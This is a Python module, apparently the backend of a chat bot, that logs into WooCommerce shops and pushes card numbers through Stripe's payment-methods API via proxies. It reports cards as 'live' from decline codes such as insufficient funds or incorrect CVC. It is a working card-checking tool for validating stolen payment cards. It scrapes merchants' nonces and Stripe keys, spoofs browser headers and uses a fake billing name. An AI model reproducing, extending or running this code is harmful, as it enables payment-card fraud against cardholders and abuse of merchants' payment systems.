import requests
import re
import random
import string
import http.cookiejar as cookielib
import json
import os
from proxy_manager import get_proxy_dict

def generate_user_agent():
    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'

def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=10))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

def generate_username():
    name = ''.join(random.choices(string.ascii_lowercase, k=10))
    number = ''.join(random.choices(string.digits, k=10))
    return f"{name}{number}"

def generate_random_code(length=32):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for _ in range(length))

def load_all_sites():
    try:
        if os.path.exists('sites.json'):
            with open('sites.json', 'r') as f:
                return json.load(f)
    except:
        pass
    return {}

def save_all_sites(sites):
    with open('sites.json', 'w') as f:
        json.dump(sites, f, indent=2)

def load_site_config(user_id, slot=None):
    sites = load_all_sites()
    user_sites = sites.get(str(user_id), {})
    
    if isinstance(user_sites, dict) and 'site' in user_sites:
        user_sites = {'1': user_sites}
        sites[str(user_id)] = user_sites
        save_all_sites(sites)
    
    if slot is None:
        return user_sites
    return user_sites.get(str(slot))

def get_next_slot(user_id):
    user_sites = load_site_config(user_id)
    if not user_sites:
        return 1
    existing = [int(k) for k in user_sites.keys() if k.isdigit()]
    return max(existing) + 1 if existing else 1

def save_site_config(user_id, site, email, password, slot=None):
    sites = load_all_sites()
    user_id = str(user_id)
    
    if user_id not in sites:
        sites[user_id] = {}
    elif isinstance(sites[user_id], dict) and 'site' in sites[user_id]:
        sites[user_id] = {'1': sites[user_id]}
    
    if slot is None:
        slot = get_next_slot(user_id)
    
    sites[user_id][str(slot)] = {
        'site': site,
        'email': email,
        'password': password
    }
    
    save_all_sites(sites)
    return int(slot)

def delete_site_config(user_id, slot=None):
    sites = load_all_sites()
    user_id = str(user_id)
    
    if slot is None:
        if user_id in sites:
            del sites[user_id]
            save_all_sites(sites)
            return True
        return False
    
    slot = str(slot)
    if user_id in sites and slot in sites[user_id]:
        del sites[user_id][slot]
        save_all_sites(sites)
        return True
    return False

def list_sites(user_id):
    user_sites = load_site_config(user_id)
    if not user_sites or not isinstance(user_sites, dict):
        return []
    
    result = []
    for slot, config in user_sites.items():
        if isinstance(config, dict) and 'site' in config:
            result.append({
                'slot': slot,
                'site': config['site'],
                'email': config['email']
            })
    return sorted(result, key=lambda x: int(x['slot']))

def verify_stripe_login(site, email, password):
    user_agent = generate_user_agent()
    
    try:
        domain = site.replace('https://', '').replace('http://', '').rstrip('/')
        
        cookie_jar = cookielib.MozillaCookieJar()
        r = requests.Session()
        r.cookies = cookie_jar
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': user_agent,
        }
        
        req = r.get(f'{site}/my-account/', headers=headers, timeout=30)
        
        nonce = None
        nonce_patterns = [
            r'id="woocommerce-login-nonce".*?value="(.*?)"',
            r'name="woocommerce-login-nonce"\s*value="([^"]+)"',
            r'value="([^"]+)"\s*name="woocommerce-login-nonce"',
        ]
        
        for pattern in nonce_patterns:
            nonce_match = re.search(pattern, req.text, re.IGNORECASE | re.DOTALL)
            if nonce_match:
                nonce = nonce_match.group(1)
                break
        
        if not nonce:
            return {'success': False, 'message': 'Site not found or not WooCommerce'}

        headers.update({
            'content-type': 'application/x-www-form-urlencoded',
            'origin': site,
            'referer': f'{site}/my-account/',
        })

        data = {
            'username': email,
            'password': password,
            'rememberme': 'forever',
            'woocommerce-login-nonce': nonce,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
        }

        r2 = r.post(f'{site}/my-account/', headers=headers, data=data, timeout=30)
        
        if 'logout' in r2.text.lower() or 'dashboard' in r2.text.lower() or 'my-account' in r2.url:
            r3 = r.get(f'{site}/my-account/add-payment-method/', headers=headers, timeout=30)
            if 'stripe' not in r3.text.lower() and 'pk_live' not in r3.text:
                return {'success': False, 'message': 'Site does not use Stripe gateway'}
            return {'success': True, 'message': 'Login successful, Stripe detected'}
        else:
            return {'success': False, 'message': 'Invalid email or password'}
            
    except requests.exceptions.Timeout:
        return {'success': False, 'message': 'Connection timeout'}
    except Exception as e:
        return {'success': False, 'message': str(e)[:100]}

def check_card(card_data: str, user_id: str, slot: str = '1') -> dict:
    config = load_site_config(user_id, slot)
    if not config:
        return {
            'card': card_data,
            'status': 'ERROR',
            'message': f'No site configured for slot {slot}. Use /addsite first',
            'approved': False
        }
    
    site = config['site']
    email = config['email']
    password = config['password']
    proxies = get_proxy_dict()
    
    try:
        cards = card_data.strip().split('|')
        if len(cards) != 4:
            return {
                'card': card_data,
                'status': 'INVALID',
                'message': 'Invalid format. Use: XXXX|MM|YY|CVV',
                'approved': False
            }
        
        user_agent = generate_user_agent()
        domain = site.replace('https://', '').replace('http://', '')
        
        cookie_jar = cookielib.MozillaCookieJar()
        r = requests.Session()
        r.cookies = cookie_jar
        
        headers = {
            'authority': domain,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
        }
        
        req = r.get(f'{site}/my-account/', headers=headers, timeout=15, proxies=proxies)
        
        nonce = None
        nonce_patterns = [
            r'id="woocommerce-login-nonce".*?value="(.*?)"',
            r'name="woocommerce-login-nonce"\s*value="([^"]+)"',
            r'value="([^"]+)"\s*name="woocommerce-login-nonce"',
            r'"woocommerce-login-nonce"\s*:\s*"([^"]+)"',
            r'_wpnonce["\s:=]+([a-f0-9]{10})',
        ]
        
        for pattern in nonce_patterns:
            nonce_match = re.search(pattern, req.text, re.IGNORECASE | re.DOTALL)
            if nonce_match:
                nonce = nonce_match.group(1)
                break
        
        if not nonce:
            return {
                'card': card_data,
                'status': 'ERROR',
                'message': 'Failed to get login nonce - site may be down or changed',
                'approved': False
            }

        headers.update({
            'content-type': 'application/x-www-form-urlencoded',
            'origin': site,
            'referer': f'{site}/my-account/',
            'sec-fetch-site': 'same-origin',
        })

        data = {
            'username': email,
            'password': password,
            'rememberme': 'forever',
            'woocommerce-login-nonce': nonce,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
        }

        r2 = r.post(f'{site}/my-account/', headers=headers, data=data, timeout=15, proxies=proxies)

        headers.update({'referer': f'{site}/my-account/'})
        r3 = r.get(f'{site}/my-account/payment-methods/', headers=headers, timeout=15, proxies=proxies)
        r4 = r.get(f'{site}/my-account/add-payment-method/', headers=headers, timeout=15, proxies=proxies)

        acc_id_match = re.search(r'"accountId":"(acct_[0-9a-zA-Z]+)"', r4.text)
        if not acc_id_match:
            return {
                'card': card_data,
                'status': 'ERROR',
                'message': 'Failed to get Stripe account ID',
                'approved': False
            }
        acc_id = acc_id_match.group(1)

        intent = re.search(r'"createSetupIntentNonce"\s*:\s*"([^"]+)"', r4.text)
        if not intent:
            intent = re.search(r'"add_payment_method_nonce"\s*:\s*"([^"]+)"', r4.text)
        if not intent:
            return {
                'card': card_data,
                'status': 'ERROR',
                'message': 'Failed to get intent nonce',
                'approved': False
            }
        intent = intent.group(1)

        action_match = re.search(r'"add_payment_method_action"\s*:\s*"([^"]+)"', r4.text)
        action_name = action_match.group(1) if action_match else 'create_setup_intent'

        pk_match = re.search(r'"key":"(pk_live_[0-9a-zA-Z]+)"', r4.text)
        if not pk_match:
            pk_match = re.search(r'"publishableKey":"(pk_live_[0-9a-zA-Z]+)"', r4.text)
        if not pk_match:
            return {
                'card': card_data,
                'status': 'ERROR',
                'message': 'Failed to get Stripe public key',
                'approved': False
            }
        pk = pk_match.group(1)

        noncec = re.search(r'"add_card_nonce"\s*:\s*"([^"]+)"', r4.text)
        if not noncec:
            noncec = re.search(r'id="woocommerce-add-payment-method-nonce"[^>]+value="([^"]+)"', r4.text)

        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user_agent,
        }

        guid = "cac2827d-5443-419b-8bac-ee21c1f75eb51067b2"
        muid = "44252c47-3f0f-43c4-9097-c449f797e84bd64bb1"
        sid = "b93ab42d-2eb7-4913-a4b9-e5c0eb8d5350e8167f"
        yy = cards[2]
        us_name = "Lucifer Murphy"
        us_country = "US"
        us_postal_code = "10080"
        us_card_number = cards[0]
        us_exp_month = cards[1]
        us_exp_year = yy[-2:]
        us_cvc = cards[3]

        stripe_data = (
            f"billing_details[name]={us_name}&"
            f"billing_details[email]={email}&"
            f"billing_details[address][country]={us_country}&"
            f"billing_details[address][postal_code]={us_postal_code}&"
            f"type=card&"
            f"card[number]={us_card_number}&"
            f"card[cvc]={us_cvc}&"
            f"card[exp_year]={us_exp_year}&"
            f"card[exp_month]={us_exp_month}&"
            f"allow_redisplay=unspecified&"
            f"pasted_fields=number&"
            f"payment_user_agent=stripe.js%2Fba4e3767a2%3B+stripe-js-v3%2Fba4e3767a2%3B+payment-element%3B+deferred-intent&"
            f"referrer={site}&"
            f"time_on_page=100340&"
            f"client_attribution_metadata[client_session_id]=46363bb5-29c2-4e7d-83ec-188cd46acde5&"
            f"client_attribution_metadata[merchant_integration_source]=elements&"
            f"client_attribution_metadata[merchant_integration_subtype]=payment-element&"
            f"client_attribution_metadata[merchant_integration_version]=2021&"
            f"client_attribution_metadata[payment_intent_creation_flow]=deferred&"
            f"client_attribution_metadata[payment_method_selection_flow]=merchant_specified&"
            f"guid={guid}&"
            f"muid={muid}&"
            f"sid={sid}&"
            f"key={pk}&"
            f"_stripe_account={acc_id}"
        )

        r5 = r.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=15, proxies=proxies)
        res = r5.json()
        
        if 'error' in res:
            error_msg = res.get('error', {}).get('message', 'Unknown error')
            if 'insufficient_funds' in error_msg.lower():
                return {
                    'card': card_data,
                    'status': 'APPROVED',
                    'message': 'Insufficient Funds (CVV Match)',
                    'approved': True
                }
            elif 'incorrect_cvc' in error_msg.lower():
                return {
                    'card': card_data,
                    'status': 'APPROVED',
                    'message': 'Incorrect CVC (Live Card)',
                    'approved': True
                }
            return {
                'card': card_data,
                'status': 'DECLINED',
                'message': error_msg,
                'approved': False
            }
        
        pm_id = res.get('id')
        if not pm_id:
            return {
                'card': card_data,
                'status': 'DECLINED',
                'message': 'Failed to create payment method',
                'approved': False
            }

        final_headers = {
            'authority': domain,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': site,
            'referer': f'{site}/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user_agent,
        }

        final_data = {
            'action': action_name,
            'wcpay-payment-method': pm_id,
            '_ajax_nonce': intent,
        }

        r6 = r.post(f'{site}/wp-admin/admin-ajax.php', cookies=cookie_jar, headers=final_headers, data=final_data, timeout=15, proxies=proxies)
        
        try:
            result = r6.json()
            msg = str(result)
        except:
            msg = r6.text[:200]
        
        if 'success' in msg.lower() and 'true' in msg.lower():
            return {
                'card': card_data,
                'status': 'APPROVED',
                'message': 'Card Added Successfully',
                'approved': True
            }
        elif 'insufficient_funds' in msg.lower():
            return {
                'card': card_data,
                'status': 'APPROVED',
                'message': 'Insufficient Funds (CVV Match)',
                'approved': True
            }
        elif 'incorrect_cvc' in msg.lower():
            return {
                'card': card_data,
                'status': 'APPROVED',
                'message': 'Incorrect CVC (Live Card)',
                'approved': True
            }
        elif 'requires_action' in msg.lower() or '3d' in msg.lower():
            return {
                'card': card_data,
                'status': 'APPROVED',
                'message': '3D Secure Required',
                'approved': True
            }
        else:
            return {
                'card': card_data,
                'status': 'DECLINED',
                'message': msg[:150] if len(msg) > 150 else msg,
                'approved': False
            }

    except Exception as e:
        return {
            'card': card_data,
            'status': 'ERROR',
            'message': str(e)[:150],
            'approved': False
        }
